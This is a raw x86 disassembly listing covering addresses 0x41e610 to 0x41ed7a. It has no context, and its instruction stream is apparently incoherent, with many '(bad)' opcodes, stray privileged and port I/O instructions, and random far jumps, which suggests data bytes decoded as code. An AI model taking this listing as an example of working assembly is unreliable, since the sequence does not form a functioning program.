  41e610:	xlat   BYTE PTR ds:[ebx]
  41e611:	icebp  
  41e612:	cli    
  41e613:	jmp    0xa9f8:0x80c66c7a
  41e61a:	popa   
  41e61b:	icebp  
  41e61c:	pop    esi
  41e61d:	mov    ebx,0xcf32caac
  41e622:	push   ds
  41e623:	lock xor ebx,DWORD PTR [eax-0x26]
  41e627:	test   BYTE PTR [ecx-0x4025f6b6],0xfe
  41e62e:	add    BYTE PTR [edi-0x77d5253d],bh
  41e634:	adc    al,0xa4
  41e636:	aas    
  41e637:	pop    ebp
  41e638:	out    0x5a,eax
  41e63a:	push   cs
  41e63b:	not    BYTE PTR [ebx+0x2e]
  41e63e:	push   ebp
  41e63f:	push   ds
  41e640:	xchg   ebx,eax
  41e641:	ins    DWORD PTR es:[edi],dx
  41e642:	outs   dx,BYTE PTR ds:[esi]
  41e643:	sub    al,0xc8
  41e645:	and    eax,0x7f061fc1
  41e64a:	push   eax
  41e64b:	sub    DWORD PTR [ecx],0xc2b5b011
  41e651:	jmp    0x6be8:0xeffca871
  41e658:	stos   BYTE PTR es:[edi],al
  41e659:	int    0x2b
  41e65b:	aad    0xbd
  41e65d:	pushf  
  41e65e:	sbb    BYTE PTR [edi],bh
  41e660:	lea    ecx,[ebx-0x70b94216]
  41e666:	shl    edx,0xb5
  41e669:	mov    edx,0x3784198d
  41e66e:	sbb    DWORD PTR [esi+0x3c101bda],edi
  41e674:	or     eax,0xfe9896a2
  41e679:	ja     0x41e6e7
  41e67b:	adc    DWORD PTR [esi],edx
  41e67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e67e:	bound  esi,QWORD PTR ds:0x9aa37b16
  41e684:	push   ecx
  41e685:	sar    DWORD PTR [esi+0x2b],1
  41e688:	mov    eax,ds:0x4ebd6551
  41e68d:	mov    edx,0xc0e08db9
  41e692:	push   esi
  41e693:	mov    BYTE PTR [edi+0x5ccda886],al
  41e699:	(bad)  [eax+0x6e]
  41e69c:	lahf   
  41e69d:	fld    DWORD PTR [edx+0x3ee006d7]
  41e6a3:	jo     0x41e66a
  41e6a5:	fisubr DWORD PTR [esi+ebx*1]
  41e6a8:	aas    
  41e6a9:	pop    edi
  41e6aa:	adc    ecx,DWORD PTR [ebx-0x5]
  41e6ad:	retf   
  41e6ae:	jg     0x41e710
  41e6b0:	stos   BYTE PTR es:[edi],al
  41e6b1:	ins    BYTE PTR es:[edi],dx
  41e6b2:	aas    
  41e6b3:	inc    esi
  41e6b4:	(bad)  
  41e6b5:	idiv   DWORD PTR [edx+eax*4]
  41e6b8:	cmp    dh,bh
  41e6ba:	cmp    eax,0xc6384839
  41e6bf:	mov    ebx,esp
  41e6c1:	les    si,DWORD PTR [edx+0x4]
  41e6c5:	adc    BYTE PTR [edx],cl
  41e6c7:	repnz pop edx
  41e6c9:	add    eax,0x3c280e64
  41e6ce:	outs   dx,BYTE PTR ds:[esi]
  41e6cf:	adc    al,0x7a
  41e6d1:	fs adc al,0x14
  41e6d4:	or     BYTE PTR [ecx+0x4c90f787],cl
  41e6da:	or     esi,ebx
  41e6dc:	add    al,0xda
  41e6de:	mov    dh,0xd3
  41e6e0:	retf   0x31e3
  41e6e3:	mov    dh,0x88
  41e6e5:	repz dec ecx
  41e6e7:	cmp    BYTE PTR fs:[edi],ah
  41e6ea:	out    dx,al
  41e6eb:	cmp    DWORD PTR [ecx-0x24],ebp
  41e6ee:	mov    ds:0xb921d3e3,eax
  41e6f3:	mov    ebp,0x7814c05c
  41e6f8:	cmp    DWORD PTR [edx+0xb14b2de],ebx
  41e6fe:	lahf   
  41e6ff:	icebp  
  41e700:	pop    ebp
  41e701:	js     0x41e704
  41e703:	mov    al,0xd0
  41e705:	push   0x2
  41e707:	retf   
  41e708:	test   al,0xb5
  41e70a:	mov    cs:0xa93c6011,eax
  41e710:	jns    0x41e6c3
  41e712:	sahf   
  41e713:	jmp    0x961f:0xa6d284ad
  41e71a:	lods   eax,DWORD PTR ds:[esi]
  41e71b:	lahf   
  41e71c:	dec    ebx
  41e71d:	xchg   ebx,eax
  41e71e:	or     al,0xc7
  41e720:	in     eax,dx
  41e721:	test   al,0xa5
  41e723:	mov    edi,0xf49dd61e
  41e728:	mov    ebx,0x2b8cc0bd
  41e72d:	mov    esp,0x6c1fac2f
  41e732:	jbe    0x41e748
  41e734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e735:	push   0xffffffda
  41e737:	add    ebp,DWORD PTR [ebx+0x2386ce43]
  41e73d:	cli    
  41e73e:	mov    dh,0xf6
  41e740:	sbb    al,0xea
  41e742:	addr16 cli 
  41e744:	pop    eax
  41e745:	xor    DWORD PTR [esi+ebx*8-0x1b3c717f],ecx
  41e74c:	inc    esi
  41e74d:	out    dx,eax
  41e74e:	inc    edx
  41e74f:	mov    dh,0xcd
  41e751:	add    ebp,DWORD PTR [edi+ebx*8]
  41e754:	inc    esi
  41e755:	jl     0x41e742
  41e757:	mov    cl,0x5d
  41e759:	hlt    
  41e75a:	pop    ds
  41e75b:	inc    esi
  41e75c:	sub    dh,BYTE PTR [edi]
  41e75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e75f:	into   
  41e760:	pop    esi
  41e761:	loope  0x41e72d
  41e763:	or     BYTE PTR [esi],dh
  41e765:	mov    ds:0x53509e2e,eax
  41e76a:	jb     0x41e776
  41e76c:	jle    0x41e79c
  41e76e:	ret    0xbe2b
  41e771:	or     al,0x8e
  41e773:	jno    0x41e76e
  41e775:	aaa    
  41e776:	jo     0x41e6fe
  41e778:	mov    ds:0x2f6681fe,al
  41e77d:	test   al,0xc4
  41e77f:	mov    dh,0xf9
  41e781:	pmaxsw mm0,QWORD PTR [eax-0x3d]
  41e785:	xchg   BYTE PTR [ebp+0xd],al
  41e788:	mov    cs,WORD PTR ds:0x507c05bd
  41e78e:	pop    ecx
  41e78f:	daa    
  41e790:	mov    DWORD PTR [ecx],edi
  41e792:	(bad)  
  41e793:	repnz push 0xffffffac
  41e796:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e799:	mov    edi,0x2cfbe5f9
  41e79e:	gs scas al,BYTE PTR es:[edi]
  41e7a0:	or     al,0xb5
  41e7a2:	div    DWORD PTR [esi-0x52]
  41e7a5:	mov    eax,0x9d038ba
  41e7aa:	cmp    esp,ebp
  41e7ac:	fisttp QWORD PTR [eax+0xc]
  41e7af:	cld    
  41e7b0:	ds and eax,0x362178b9
  41e7b6:	ret    0xb6b5
  41e7b9:	and    DWORD PTR [esi-0x4e],edx
  41e7bc:	ins    DWORD PTR es:[edi],dx
  41e7bd:	mov    ds:0x8575ef1e,eax
  41e7c2:	xchg   esi,eax
  41e7c3:	cmc    
  41e7c4:	fidiv  DWORD PTR [ecx-0x4b]
  41e7c7:	push   ebx
  41e7c8:	ret    0x12c
  41e7cb:	icebp  
  41e7cc:	dec    BYTE PTR [edx+0x42fc5f52]
  41e7d2:	pop    edx
  41e7d3:	mov    dl,0xbb
  41e7d5:	daa    
  41e7d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d7:	nop
  41e7d8:	pop    ss
  41e7d9:	mov    edi,ds
  41e7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7dc:	pop    ds
  41e7dd:	mov    ebx,0x7b1607c4
  41e7e2:	dec    eax
  41e7e3:	rcl    DWORD PTR ds:0x2788d184,cl
  41e7e9:	mov    al,ds:0x93d0608c
  41e7ee:	lahf   
  41e7ef:	aad    0xff
  41e7f1:	aad    0xef
  41e7f3:	or     edx,DWORD PTR [ebx-0x32ce6c58]
  41e7f9:	ret    0xfde3
  41e7fc:	inc    esp
  41e7fd:	fdiv   QWORD PTR [edi]
  41e7ff:	enter  0xb7d2,0xa3
  41e803:	iret   
  41e804:	cmp    eax,0x91fd2a1b
  41e809:	pop    ebx
  41e80a:	mov    ?,WORD PTR [eax+0x3]
  41e80d:	lea    eax,[esi-0x5d6854aa]
  41e813:	in     al,0xbc
  41e815:	stos   BYTE PTR es:[edi],al
  41e816:	out    dx,al
  41e817:	mov    bl,0xd1
  41e819:	mov    ecx,0x5406e111
  41e81e:	adc    eax,DWORD PTR [ecx]
  41e820:	in     al,dx
  41e821:	sahf   
  41e822:	pop    ebx
  41e823:	adc    cl,bl
  41e825:	pop    es
  41e826:	sub    edi,ebp
  41e828:	aas    
  41e829:	or     al,0xee
  41e82b:	xor    dh,bh
  41e82d:	cdq    
  41e82e:	xchg   esi,esi
  41e830:	scas   al,BYTE PTR es:[edi]
  41e831:	ds mov al,0x5
  41e834:	inc    eax
  41e835:	mov    eax,0x311f9366
  41e83a:	cmp    al,0x70
  41e83c:	jo     0x41e898
  41e83e:	ins    BYTE PTR es:[edi],dx
  41e83f:	enter  0x3721,0xc8
  41e843:	inc    ebp
  41e844:	pop    ss
  41e845:	pop    edx
  41e846:	xor    bh,BYTE PTR [esi]
  41e848:	push   edi
  41e849:	mov    bh,0x82
  41e84b:	pop    ecx
  41e84c:	lods   eax,DWORD PTR ds:[esi]
  41e84d:	pop    eax
  41e84e:	jmp    0xd779a450
  41e853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e854:	push   eax
  41e855:	jmp    0xfe827323
  41e85a:	cmp    bl,BYTE PTR [edx+0x2b]
  41e85d:	jecxz  0x41e829
  41e85f:	aas    
  41e860:	mov    ebx,0x9d35412e
  41e865:	inc    eax
  41e866:	(bad)  
  41e867:	jmp    0x41e829
  41e869:	pusha  
  41e86a:	test   DWORD PTR [edx],0xf27be9dd
  41e870:	out    0x53,eax
  41e872:	or     edx,DWORD PTR [ebx-0x63]
  41e875:	outs   dx,DWORD PTR ds:[esi]
  41e876:	jecxz  0x41e816
  41e878:	cli    
  41e879:	lds    ebx,FWORD PTR [ecx+0x5]
  41e87c:	imul   edx,DWORD PTR [ebp+0x5f5aa805],0xf95420fc
  41e886:	add    al,0x93
  41e888:	mov    ebp,0x39e894f3
  41e88d:	dec    eax
  41e88e:	sbb    al,0x84
  41e890:	(bad)  
  41e891:	(bad)  
  41e892:	jp     0x41e815
  41e894:	mov    DWORD PTR [ecx],ebx
  41e896:	out    dx,al
  41e897:	sbb    esp,edi
  41e899:	mov    eax,ds:0x6e5947f0
  41e89e:	pop    esp
  41e89f:	call   0xea85:0x821122ee
  41e8a6:	mov    ebx,0x32aa8507
  41e8ab:	jae    0x41e912
  41e8ad:	or     al,0x22
  41e8af:	dec    edi
  41e8b0:	xchg   edx,eax
  41e8b1:	add    eax,0xe97ef1d8
  41e8b6:	pop    ebp
  41e8b7:	cmp    al,0xad
  41e8b9:	cmp    DWORD PTR [edi+0x5a],0xffffffee
  41e8bd:	fst    QWORD PTR [ebx+0x71]
  41e8c0:	or     dh,bl
  41e8c2:	mov    ah,0xed
  41e8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8c5:	popa   
  41e8c6:	test   al,0x2c
  41e8c8:	mov    bh,BYTE PTR [ebp+0x7e]
  41e8cb:	mov    bl,dh
  41e8cd:	sti    
  41e8ce:	ja     0x41e859
  41e8d0:	pop    edi
  41e8d1:	fidiv  DWORD PTR [ebx+0x1c]
  41e8d4:	jmp    0xee7577f4
  41e8d9:	cmp    al,0x59
  41e8db:	or     al,0xed
  41e8dd:	jbe    0x41e930
  41e8df:	das    
  41e8e0:	mov    ah,bl
  41e8e2:	sbb    ah,BYTE PTR [ecx+0x55d7df6]
  41e8e8:	dec    ecx
  41e8e9:	enter  0x7789,0x64
  41e8ed:	loop   0x41e901
  41e8ef:	dec    esi
  41e8f0:	mov    edx,0x55968482
  41e8f5:	jecxz  0x41e964
  41e8f7:	dec    edi
  41e8f8:	test   DWORD PTR [esi],esp
  41e8fa:	lods   eax,DWORD PTR ds:[esi]
  41e8fb:	dec    edx
  41e8fc:	sbb    al,0xec
  41e8fe:	cdq    
  41e8ff:	pop    eax
  41e900:	ss inc ecx
  41e902:	xchg   ebx,eax
  41e903:	dec    edx
  41e904:	pop    ebx
  41e905:	inc    ecx
  41e906:	lahf   
  41e907:	inc    eax
  41e908:	mov    al,0x3f
  41e90a:	or     bl,dh
  41e90c:	dec    esi
  41e90d:	inc    eax
  41e90e:	sub    edx,DWORD PTR [ecx+eiz*8-0x78169b5b]
  41e915:	int    0x87
  41e917:	inc    ebx
  41e918:	add    eax,0x41293814
  41e91d:	inc    eax
  41e91e:	test   eax,0x6748d06
  41e923:	xor    eax,0xa2c93bcd
  41e928:	cmp    al,0xf6
  41e92a:	dec    ebp
  41e92b:	mov    cl,0x73
  41e92d:	and    DWORD PTR [ebx+0x29cc8d0c],esp
  41e933:	sbb    eax,0xce1f774e
  41e938:	lods   eax,DWORD PTR ds:[esi]
  41e939:	mov    dh,0xb1
  41e93b:	sbb    al,0x9
  41e93d:	dec    esp
  41e93e:	add    edx,esi
  41e940:	in     al,dx
  41e941:	adc    eax,0x46478bda
  41e946:	pop    ss
  41e947:	and    bh,bh
  41e949:	ficom  DWORD PTR [edx-0x61]
  41e94c:	xor    al,0x99
  41e94e:	test   al,dh
  41e950:	jmp    0xd70f1d14
  41e955:	add    eax,0x9d100037
  41e95a:	repnz fstp TBYTE PTR [ebx-0x6333d55]
  41e961:	cmp    eax,0x31e210b8
  41e966:	lds    edi,FWORD PTR [esi-0x7c8e240c]
  41e96c:	mov    ds:0x7a0e6f0a,al
  41e971:	repz push esi
  41e973:	or     edi,esp
  41e975:	jne    0x41e929
  41e977:	xor    ch,dl
  41e979:	jnp    0x41e98c
  41e97b:	adc    DWORD PTR [esi+esi*8-0x46],ebp
  41e97f:	sahf   
  41e980:	repz mov ecx,0xbebc40dd
  41e986:	cdq    
  41e987:	mov    bl,BYTE PTR [edx]
  41e989:	cwde   
  41e98a:	xlat   BYTE PTR ds:[ebx]
  41e98b:	or     eax,0xa16a5a65
  41e990:	test   eax,0x1b7976ac
  41e995:	push   edi
  41e996:	jno    0x41e9b9
  41e998:	std    
  41e999:	jmp    0x462c:0x48dc4e1e
  41e9a0:	gs xchg edx,eax
  41e9a2:	jo     0x41e969
  41e9a4:	mov    al,ds:0x8b98d1f0
  41e9a9:	pushf  
  41e9aa:	cld    
  41e9ab:	dec    edx
  41e9ac:	dec    esp
  41e9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9ae:	or     DWORD PTR [ecx+edx*2+0x384dd58a],ecx
  41e9b5:	jne    0x41ea2f
  41e9b7:	inc    ecx
  41e9b8:	mov    al,ds:0x6cbfaca0
  41e9bd:	inc    edx
  41e9be:	mov    bh,0x2e
  41e9c0:	dec    edi
  41e9c1:	lds    esp,FWORD PTR ds:0x24bc1e67
  41e9c7:	es out dx,eax
  41e9c9:	adc    dh,BYTE PTR [ebp-0x6a32ca72]
  41e9cf:	jnp    0x41e9fb
  41e9d1:	pop    ss
  41e9d2:	pop    ss
  41e9d3:	pop    eax
  41e9d4:	push   ebx
  41e9d5:	jbe    0x41ea46
  41e9d7:	or     eax,0x8ea6a2a4
  41e9dc:	cmp    BYTE PTR [esi],al
  41e9de:	mov    bl,0xe0
  41e9e0:	sub    eax,0xd5af25ec
  41e9e5:	jns    0x41ea2e
  41e9e7:	mov    esp,0xc68e00c1
  41e9ec:	xchg   BYTE PTR [ebp+0x1e8baace],al
  41e9f2:	sar    BYTE PTR [eax],0xe
  41e9f5:	jmp    0x3657c8e2
  41e9fa:	jmp    0x41e9db
  41e9fc:	inc    ebp
  41e9fd:	add    DWORD PTR ds:0x62289569,edi
  41ea03:	cmp    edi,edi
  41ea05:	mov    ebp,0x78abcf4e
  41ea0a:	pop    esp
  41ea0b:	ret    0x6a01
  41ea0e:	loope  0x41e9c5
  41ea10:	adc    eax,0xb631a380
  41ea15:	popa   
  41ea16:	data16 in al,0xa4
  41ea19:	fadd   QWORD PTR [ebx+0x49a9a740]
  41ea1f:	vpsadbw xmm5,xmm4,xmm3
  41ea23:	xor    DWORD PTR [edi+0x7b162e9c],0xfffffff9
  41ea2a:	push   ds
  41ea2b:	out    dx,al
  41ea2c:	mov    eax,ds:0xaae537c5
  41ea31:	xor    dh,cl
  41ea33:	cmp    DWORD PTR gs:[edx],0xffffffc7
  41ea37:	and    al,0x9
  41ea39:	sti    
  41ea3a:	mov    bl,0x97
  41ea3c:	dec    eax
  41ea3d:	adc    BYTE PTR [edi-0x4009799a],0x79
  41ea44:	jl     0x41ea9c
  41ea46:	leave  
  41ea47:	push   ss
  41ea48:	or     eax,0xb51c2caa
  41ea4d:	push   ecx
  41ea4e:	mov    cl,0x59
  41ea50:	lods   eax,DWORD PTR ds:[esi]
  41ea51:	outs   dx,BYTE PTR ds:[esi]
  41ea52:	mov    ebx,0xc9c2e628
  41ea57:	fmul   QWORD PTR [eax+0x5f]
  41ea5a:	mov    esi,0xa9aa40d6
  41ea5f:	ja     0x41ea6a
  41ea61:	nop
  41ea62:	push   0xffffff83
  41ea64:	clc    
  41ea65:	cmp    al,0xb1
  41ea68:	adc    al,0xa6
  41ea6a:	out    0x5c,al
  41ea6c:	inc    esp
  41ea6d:	push   eax
  41ea6e:	scas   al,BYTE PTR es:[edi]
  41ea6f:	arpl   WORD PTR [ecx],bx
  41ea71:	test   BYTE PTR [ebx+0x2f],0x87
  41ea75:	cmp    BYTE PTR [edi-0xa],ch
  41ea78:	data16 add BYTE PTR [edi+eax*2],ch
  41ea7c:	xchg   DWORD PTR [ebp+0x10935fe1],esp
  41ea82:	xor    al,0x83
  41ea84:	sub    eax,0x3c777ec2
  41ea89:	mov    ebp,DWORD PTR [edx+0x347f3b7b]
  41ea8f:	pop    edx
  41ea90:	and    BYTE PTR [edi],ch
  41ea92:	mov    ebp,0x69e22ad
  41ea97:	jne    0x41eaf2
  41ea99:	hlt    
  41ea9a:	cld    
  41ea9b:	xchg   ecx,eax
  41ea9c:	jle    0x41eab2
  41ea9e:	inc    esp
  41ea9f:	dec    edi
  41eaa0:	push   cs
  41eaa1:	mov    edx,0x5dadefd4
  41eaa6:	ins    BYTE PTR es:[edi],dx
  41eaa7:	(bad)  
  41eaa8:	or     bh,BYTE PTR fs:[ebp-0x54469db5]
  41eaaf:	or     al,0xdb
  41eab1:	adc    BYTE PTR [esi+0x75d656f5],dl
  41eab7:	inc    ecx
  41eab8:	inc    esp
  41eab9:	and    ecx,edi
  41eabb:	adc    eax,0x21c0c7f1
  41eac0:	cmp    eax,0xee4e83cd
  41eac5:	shl    DWORD PTR [eax],1
  41eac7:	pop    ds
  41eac8:	cwde   
  41eac9:	es je  0x41ea8d
  41eacc:	(bad)  
  41eacd:	call   0x133c7607
  41ead2:	inc    edi
  41ead3:	push   0xffffffc2
  41ead5:	stos   DWORD PTR es:[edi],eax
  41ead6:	(bad)  
  41ead7:	jnp    0x41eb3f
  41ead9:	dec    edi
  41eada:	push   0xf5250a0f
  41eadf:	ret    
  41eae0:	mov    ah,BYTE PTR [esi+edx*2]
  41eae3:	shl    DWORD PTR [ecx],1
  41eae5:	adc    edi,DWORD PTR [edi]
  41eae7:	or     bl,ch
  41eae9:	stc    
  41eaea:	aaa    
  41eaeb:	cmp    al,BYTE PTR [edx-0x1e]
  41eaee:	pusha  
  41eaef:	fiadd  WORD PTR [edi]
  41eaf1:	mov    eax,ds:0x9a6bf76f
  41eaf6:	loopne 0x41eae7
  41eaf8:	(bad)  
  41eaf9:	es leave 
  41eafb:	ins    DWORD PTR es:[edi],dx
  41eafc:	adc    DWORD PTR [esi-0x4],ebx
  41eaff:	xchg   ebp,eax
  41eb00:	jno    0x41eb25
  41eb02:	mov    WORD PTR [edx+ecx*8-0x4dd40639],gs
  41eb09:	out    0x8d,eax
  41eb0b:	in     eax,dx
  41eb0c:	mov    eax,DWORD PTR [ecx]
  41eb0e:	icebp  
  41eb0f:	bound  ebp,QWORD PTR [eax+edx*1-0x30]
  41eb13:	cmp    dl,BYTE PTR [eax-0x59]
  41eb16:	iret   
  41eb17:	test   BYTE PTR [esp+eiz*4+0x3906ad05],cl
  41eb1e:	inc    ecx
  41eb1f:	imul   ecx,DWORD PTR [edi-0x73],0x46
  41eb23:	test   BYTE PTR [esi-0x10da4b99],bh
  41eb29:	add    BYTE PTR [eax+edx*2+0x3e4c947c],bl
  41eb30:	iret   
  41eb31:	sbb    DWORD PTR ds:0x8e35b10a,0xc94d6aeb
  41eb3b:	in     al,dx
  41eb3c:	add    DWORD PTR [eax],ebp
  41eb3e:	dec    esi
  41eb3f:	add    eax,0x4155f33f
  41eb44:	sti    
  41eb45:	lahf   
  41eb46:	imul   esp,DWORD PTR [eax],0x1f
  41eb49:	adc    eax,0x5b885474
  41eb4e:	loopne 0x41eb1d
  41eb50:	out    dx,eax
  41eb51:	mov    ebx,0xdc9f324f
  41eb56:	test   DWORD PTR [eax+0x13d64fbd],0x1af81144
  41eb60:	pushf  
  41eb61:	ins    DWORD PTR es:[edi],dx
  41eb62:	push   ecx
  41eb63:	in     al,dx
  41eb64:	jne    0x41eaf4
  41eb66:	in     al,dx
  41eb67:	add    eax,DWORD PTR [ebp+0x4373f75]
  41eb6d:	in     al,dx
  41eb6e:	sub    eax,0x2867c457
  41eb73:	cwde   
  41eb74:	repz sub al,BYTE PTR ss:[esi+0x45]
  41eb79:	repnz sub eax,DWORD PTR [edi+edi*4-0x1e]
  41eb7e:	pop    ds
  41eb7f:	inc    esi
  41eb80:	aaa    
  41eb81:	ficomp WORD PTR [eax]
  41eb83:	or     DWORD PTR [edx],edx
  41eb85:	das    
  41eb86:	pop    ds
  41eb87:	(bad)  
  41eb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb89:	hlt    
  41eb8a:	xor    BYTE PTR [edi-0x79],dl
  41eb8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb8e:	in     eax,dx
  41eb8f:	push   esp
  41eb90:	popf   
  41eb91:	sbb    DWORD PTR [ebx-0x5b7d4688],esp
  41eb97:	xor    al,0xd2
  41eb99:	enter  0x71da,0x90
  41eb9d:	(bad)  
  41eb9f:	mov    ecx,ecx
  41eba1:	cdq    
  41eba2:	add    DWORD PTR [ecx+0x60b4e2ae],esi
  41eba8:	lock gs pushw cs
  41ebac:	dec    esi
  41ebad:	sbb    BYTE PTR [edi-0x322e3182],al
  41ebb3:	mov    al,ds:0x33e1c8df
  41ebb8:	and    al,0x89
  41ebba:	xchg   ebp,eax
  41ebbb:	push   ds
  41ebbc:	js     0x4bfaa9b7
  41ebc2:	or     al,0x41
  41ebc4:	and    ebx,esp
  41ebc6:	mov    ch,0x7e
  41ebc8:	dec    esi
  41ebc9:	es loop 0x41ec20
  41ebcc:	loop   0x41ebe4
  41ebce:	iret   
  41ebcf:	xchg   edx,eax
  41ebd0:	push   esi
  41ebd1:	div    DWORD PTR [esi]
  41ebd3:	xor    al,0xf7
  41ebd5:	ss rcr ebp,cl
  41ebd8:	push   edx
  41ebd9:	mov    eax,ds:0x17654f58
  41ebde:	or     BYTE PTR [esi+eiz*4],ah
  41ebe1:	mov    eax,0x83cce1e1
  41ebe6:	push   es
  41ebe7:	jns    0x41eb9e
  41ebe9:	push   cs
  41ebea:	xlat   BYTE PTR ds:[ebx]
  41ebeb:	fld    DWORD PTR [ebx-0x33]
  41ebee:	in     eax,dx
  41ebef:	fsubp  st(4),st
  41ebf1:	rcr    bh,cl
  41ebf3:	in     al,dx
  41ebf4:	push   0xffffffcd
  41ebf6:	jmp    0x2c4d64c0
  41ebfb:	inc    edi
  41ebfc:	mov    ebp,DWORD PTR [esi-0x69]
  41ebff:	mov    dh,0x89
  41ec01:	std    
  41ec02:	in     al,dx
  41ec03:	enter  0xd6e4,0xf3
  41ec07:	dec    ecx
  41ec08:	xor    dl,BYTE PTR [esp+eax*2]
  41ec0b:	jbe    0x41eba8
  41ec0d:	mov    cl,ch
  41ec0f:	mov    bl,0x10
  41ec11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec12:	or     DWORD PTR [edx-0x17],eax
  41ec15:	addr16 push edi
  41ec17:	popa   
  41ec18:	icebp  
  41ec19:	test   al,0x73
  41ec1b:	lahf   
  41ec1c:	and    eax,0x82498a5d
  41ec21:	enter  0x2add,0xcb
  41ec25:	pop    ds
  41ec26:	jecxz  0x41ec8a
  41ec28:	mov    esi,0xecbe983b
  41ec2d:	pop    ss
  41ec2e:	in     eax,dx
  41ec2f:	dec    edx
  41ec30:	inc    ebp
  41ec31:	add    BYTE PTR [eax],0xfb
  41ec34:	lds    edi,FWORD PTR ds:0x2e1b1f30
  41ec3a:	inc    ecx
  41ec3b:	add    DWORD PTR [edi-0x1c],esi
  41ec3e:	jmp    0x41ebcd
  41ec40:	add    BYTE PTR [edi+0x41446974],0x4f
  41ec47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec48:	jg     0x41ec5b
  41ec4a:	jne    0x41ebf1
  41ec4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec4e:	(bad)  
  41ec4f:	ja     0x41eca1
  41ec51:	and    al,0x9c
  41ec53:	pusha  
  41ec54:	aas    
  41ec55:	rcl    ah,1
  41ec57:	mov    eax,ds:0x7ada1b96
  41ec5c:	xchg   ebp,eax
  41ec5d:	sbb    edx,DWORD PTR [eax-0x2cd002b1]
  41ec63:	jle    0x41ec60
  41ec65:	and    al,0x7e
  41ec67:	or     eax,0x906379de
  41ec6c:	sub    DWORD PTR [edx],0x43
  41ec6f:	stos   BYTE PTR es:[edi],al
  41ec70:	push   ss
  41ec71:	(bad)  
  41ec72:	enter  0x3f7c,0x2
  41ec76:	and    al,0xae
  41ec78:	mov    ds:0xb50a4965,al
  41ec7d:	inc    esi
  41ec7e:	mov    ebp,0x59bfecb5
  41ec83:	pusha  
  41ec84:	mov    esi,0x1c61db72
  41ec89:	add    DWORD PTR ds:0x643935aa,edx
  41ec8f:	jp     0x41ec73
  41ec91:	scas   eax,DWORD PTR es:[edi]
  41ec92:	push   eax
  41ec93:	and    eax,0xd00c4ab8
  41ec98:	test   BYTE PTR [ebp+0x53e894c6],0xc9
  41ec9f:	rcr    DWORD PTR [ecx],cl
  41eca1:	test   ebp,esp
  41eca3:	pop    edi
  41eca4:	lahf   
  41eca5:	aad    0x32
  41eca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eca8:	hlt    
  41eca9:	push   esi
  41ecaa:	sbb    al,0x4f
  41ecac:	pop    ss
  41ecad:	or     DWORD PTR [ecx+0x64],0x68
  41ecb1:	mov    ah,cl
  41ecb3:	pop    esp
  41ecb4:	push   esp
  41ecb5:	das    
  41ecb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecb7:	call   0x7362:0x5ee7e2c1
  41ecbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecbf:	push   0x735849a7
  41ecc4:	xchg   esp,eax
  41ecc5:	loope  0x41ec71
  41ecc7:	ds jb  0x41ec7e
  41ecca:	out    0x2c,al
  41eccc:	into   
  41eccd:	push   eax
  41ecce:	push   cs
  41eccf:	js     0x41ec96
  41ecd1:	fbstp  TBYTE PTR ds:0xd3a0ea61
  41ecd7:	dec    edi
  41ecd8:	out    0xc2,al
  41ecda:	js     0x41ed52
  41ecdc:	xor    ebp,eax
  41ecde:	out    dx,eax
  41ecdf:	scas   eax,DWORD PTR es:[edi]
  41ece0:	in     al,dx
  41ece1:	xor    DWORD PTR [ebp+ecx*2+0x6b47273d],ebx
  41ece8:	jne    0x41ec72
  41ecea:	push   ss
  41eceb:	mov    ds:0x75ba3d3,al
  41ecf0:	inc    ebx
  41ecf1:	test   eax,0xcb17131d
  41ecf6:	lahf   
  41ecf7:	jae    0x41ecbd
  41ecf9:	lds    esp,FWORD PTR [eax]
  41ecfb:	stos   BYTE PTR es:[edi],al
  41ecfc:	lahf   
  41ecfd:	std    
  41ecfe:	sbb    BYTE PTR [eax-0x78e99dcd],ch
  41ed04:	arpl   WORD PTR [ebx+ecx*4],bp
  41ed07:	adc    eax,0xa9b46c3d
  41ed0c:	mov    ch,0x7c
  41ed0e:	out    dx,al
  41ed0f:	sub    al,0xbd
  41ed11:	(bad)
  41ed15:	adc    al,0x8
  41ed17:	push   eax
  41ed18:	(bad)  [ecx-0x32afc5a8]
  41ed1e:	mov    ebp,0x48a48c3
  41ed23:	std    
  41ed24:	sbb    DWORD PTR [ecx],0xdc002ca2
  41ed2a:	push   ebp
  41ed2b:	dec    eax
  41ed2c:	ja     0x41ecb1
  41ed2e:	ins    DWORD PTR es:[edi],dx
  41ed2f:	dec    esp
  41ed30:	xchg   ecx,eax
  41ed31:	xchg   DWORD PTR [ecx+0x3c],esi
  41ed34:	mov    eax,0xdb00dcf2
  41ed39:	jp     0x41ecf6
  41ed3b:	jno    0x41ecea
  41ed3d:	fnstcw WORD PTR [edx-0x2ebfb799]
  41ed43:	mov    eax,ds:0xaa8bbc5a
  41ed48:	sets   BYTE PTR [ebx+0x1]
  41ed4c:	inc    edi
  41ed4d:	int    0x76
  41ed4f:	push   ebp
  41ed50:	xchg   BYTE PTR [eax-0x62],ch
  41ed53:	mov    dl,0xc6
  41ed55:	stc    
  41ed56:	fadd   DWORD PTR [ebx]
  41ed58:	mov    edi,DWORD PTR [edi+0xbca4126]
  41ed5e:	or     eax,0xa251ea33
  41ed63:	inc    esi
  41ed64:	dec    ebp
  41ed65:	shl    DWORD PTR [esi],cl
  41ed67:	or     eax,0x6801a163
  41ed6c:	pop    es
  41ed6d:	adc    dh,BYTE PTR [eax-0x26e13029]
  41ed73:	sbb    eax,0x206a1c33
  41ed78:	cs in  al,dx
  41ed7a:	mov    ecx,edi
